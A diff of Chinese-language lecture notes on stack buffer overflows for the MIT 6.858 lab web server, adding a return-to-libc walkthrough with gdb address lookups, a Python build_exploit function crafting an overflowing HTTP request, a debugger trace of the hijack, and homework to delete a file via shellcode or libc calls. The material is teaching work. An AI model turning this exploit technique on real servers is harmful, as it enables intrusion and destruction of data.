@@ -6,7 +6,7 @@
 
 ---
 
-###shellcode原理
+###Shellcode原理
 
 参考资料：[Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html#article)
 
@@ -260,11 +260,11 @@ def build_exploit(shellcode):
 
 参考资料：[Bypassing non-executable-stack during exploitation using return-to-libc](http://css.csail.mit.edu/6.858/2014/readings/return-to-libc.pdf)
 
-大多数操作系统为了防御缓冲区溢出攻击将栈标记为不可执行，之前在栈中注入shellcode的方法失效。一种可以绕过不可执行栈的方法是**return-to-libc**攻击。该攻击将控制流引向标准库libc中函数：
+大多数操作系统为了防御缓冲区溢出攻击，不允许栈中内容执行，在栈中注入shellcode的方法就失效了。一种可以绕过不可执行栈的方法是**return-to-libc**攻击。该攻击将控制流引向标准库libc中函数，而不需要向栈中注入代码。攻击分为3步：
 
 1. 查找欲利用的在标准库libc中函数的位置，例如`execl`，`system`，或`unlink`
-1. 布置栈中内容来准备调用相关函数，例如`system("/bin/sh")`
-1. 利用`ret`指令来调转到相关函数
+1. 改写返回地址为libc函数地址，在栈中布置函数参数，构造一个libc函数的调用环境
+1. 待有漏洞函数返回时，根据返回地址调转到libc函数
 
 启动不可执行栈服务：
 
@@ -272,25 +272,153 @@ def build_exploit(shellcode):
 $ ./clean-env.sh ./zookld zook-nxstack.conf
 ```
 
+首先，用`gdb`查找libc中函数`system()`地址。
+
+``` sh
+$ gdb -q -p $(pgrep zookfs)
+(gdb) p system
+$1 = {<text variable, no debug info>} 0x40065100 <__libc_system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0x40058150 <__GI_exit>
+``` 
+
+得到了`system()`地址为`0x40065100`。但其中最后一个字节的`0x00`导致其不能在字符串中出现。因此，在本漏洞中无法直接使用，而改为调用`exit(16843009)`(`16843009`=`0x01010101`)来做演示，函数地址`0x40058150`。
+
+为了令`http_serve()`正常执行后返回，不能改写`handler`。记录`handler`初始值备用。
+
+``` sh
+(gdb) p handler
+$2 = (void (*)(int, const char *)) 0x80495ea <http_serve_none>
+```
+
+
+[](为了执行`system("/bin/sh")`，还需要一个`"/bin/sh"`字符串。有些情况下，该字符串在环境变量`SHELL`的值中，而环境变量在启动进程时已经被作为参数压入栈底，可用`gdb`在栈中搜索，例如`x/1000s $esp`。本例中未载入该环境变量，需在缓冲区中添加。)
+
+
+
+然后，在栈中布置参数为调用做准备。当漏洞函数返回时，根据返回地址跳转到libc函数，libc函数从栈中读取参数。
+
+```  
+     stack bottom                           
++———————————————————————————————————————————————————————+ (0x01010101)  
+|       name         |<——— (+12) |      argument        | (16843009)
++————————————————————+           +——————————————————————+   
+|      fd = 3        |<——— (+8)  |    return address    | (ABCD)
++————————————————————+           +——————————————————————+
+|   return address   |<——— (+4)  |    exit() address    | (0x40058150)
++————————————————————+           +——————————————————————+
+|        ebp         |<——— (0)   |                      |<——0xbfffde08
++————————————————————+           |                      |
+|                    |           |                      |
++————————————————————+           +——————————————————————+
+|  void (*handler)   |  ^        |     unchanged        | (0x80495ea)
++————————————————————+  |        +——————————————————————+         
+|pn[1023]   ^        |  |        |                      |   
+|           |        |  |        |                      |   
+|           |        |  | name[0]|                      |
+|           |        +———————————+——————————————————————+
+|           |   pn[0]|   getwd   |  "/home/httpd/lab/"  |
++———————————————————————————————————————————————————————+<——0xbfffd9fc
+
+```
+
+构造HTTP请求：
+
+``` python
+def build_exploit(shellcode):
+
+    handler = 0x80495ea
+    exit_addr = 0x40058150
+    exit_status = 0x01010101
+
+    req =   "GET /" + \
+            'A' * (1024-len("/home/httpd/lab/")) + \
+            struct.pack("<I",handler) + \
+            'A' * 12 + \
+            struct.pack("<I",exit_addr) + \
+            "ABCD" + \
+            struct.pack("<I",exit_status) + \
+            " HTTP/1.0\r\n" + \
+            "\r\n"
+    return req
+
+```
+
+用`gdb`调试：
+
+``` gas
+$ gdb -p $(pgrep zookfs)
+(gdb) b http_serve
+Breakpoint 1 at 0x804951c: file http.c, line 275.
+(gdb) c
+Continuing.
+
+[发送请求: ./exploit-4sh.py localhost 8080]
+
+[New process 9883]
+[Switching to process 9883]
+
+Breakpoint 1, http_serve (fd=3, name=0x80510b4 "/", 'A' <repeats 199 times>...) at http.c:275
+warning: Source file is more recent than executable.
+275         void (*handler)(int, const char *) = http_serve_none;
+(gdb) n
+279         getcwd(pn, sizeof(pn));
+(gdb)
+280         setenv("DOCUMENT_ROOT", pn, 1);
+(gdb)
+282         strcat(pn, name);
+(gdb)
+283         split_path(pn);
+(gdb) x/10s pn     [查看buffer]
+0xbfffd9fc:     "/home/httpd/lab/", 'A' <repeats 184 times>...
+0xbfffdac4:     'A' <repeats 200 times>...
+0xbfffdb8c:     'A' <repeats 200 times>...
+0xbfffdc54:     'A' <repeats 200 times>...
+0xbfffdd1c:     'A' <repeats 200 times>...
+0xbfffdde4:     'A' <repeats 24 times>, "\352\225\004\b", 'A' <repeats 12 times>, "P\201\005@ABCD\001\001\001\001"
+0xbfffde19:     " "
+0xbfffde1b:     ""
+0xbfffde1c:     ",\376\377\277"
+0xbfffde21:     ""
+(gdb) p handler     [查看handler是否被改写]
+$1 = (void (*)(int, const char *)) 0x80495ea <http_serve_none>
+(gdb) x/4x $ebp+4     [查看返回地址]
+0xbfffde0c:     0x50    0x81    0x05    0x40
+(gdb) x/4x $ebp+12    [查看exit()参数]
+0xbfffde14:     0x01    0x01    0x01    0x01
+(gdb) n
+285         if (!stat(pn, &st))
+(gdb)
+296         handler(fd, pn);
+(gdb)
+297     }
+(gdb)                [继续执行到exit]
+__GI_exit (status=16843009) at exit.c:103
+103     exit.c: No such file or directory.
+(gdb)
+104     in exit.c
+(gdb)
+[Inferior 2 (process 9883) exited with code 01]
+```
 
 ---
 
 ###作业：删除敏感文件
 
-实验资料: [MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm)中Lab 1。
+实验资料：[MIT 6.858 Computer Systems Security](http://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-858-computer-systems-security-fall-2014/index.htm)中Lab 1。
 
 ####1. 可执行栈上shellcode攻击
 
-利用缓冲区溢出漏洞将shellcode注入到web服务器，删除一个敏感文件`/home/httpd/grades.txt`。
+利用缓冲区溢出漏洞将shellcode注入到web服务器，删除一个敏感文件`/home/httpd/grades.txt`。主要任务是构造一个新的shellcode。
 
-主要任务是构造新shellcode，**注意：**删除文件系统调用`SYS_unlink`调用号是`10`或`'\n'`(newline)。若`'\n'`直接出现在HTTP请求URL中，则会被截断，因此需要特殊处理。
+**提示：**删除文件系统调用`SYS_unlink`调用号是`10`或`'\n'`(newline)。若`'\n'`直接出现在HTTP请求URL中，则会被截断，因此需要特殊处理。
 
 实验会用到下列命令：
 
+- 创建新文件：`touch /home/httpd/grades.txt`
 - 编译：`gcc -m32 -c -o shellcode.bin shellcode.S`
 - 提取二进制指令：`objcopy -S -O binary -j .text shellcode.bin`
-- 执行：`./run-shellcode shellcode.bin`
-- 创建新文件：`touch /home/httpd/grades.txt`
+- 执行二进制指令：`./run-shellcode shellcode.bin`
 
 将攻击程序命名为`exploit-3.py`，用`make check-exstack`来检查攻击是否成功。
 
@@ -299,6 +427,8 @@ $ ./clean-env.sh ./zookld zook-nxstack.conf
 在栈不可执行的web服务器上，采用return-to-libc攻击删除敏感文件`/home/httpd/grades.txt`。
 
 将攻击程序命名为`exploit-4a.py`和`exploit-4b.py`，用`make check-libc`来检查攻击是否成功。
+
+**提示：**libc中`unlink()`函数参数是一个指向以`'\0'`结尾字符串的指针。因此，需在栈中注入字符串。
 
 
 
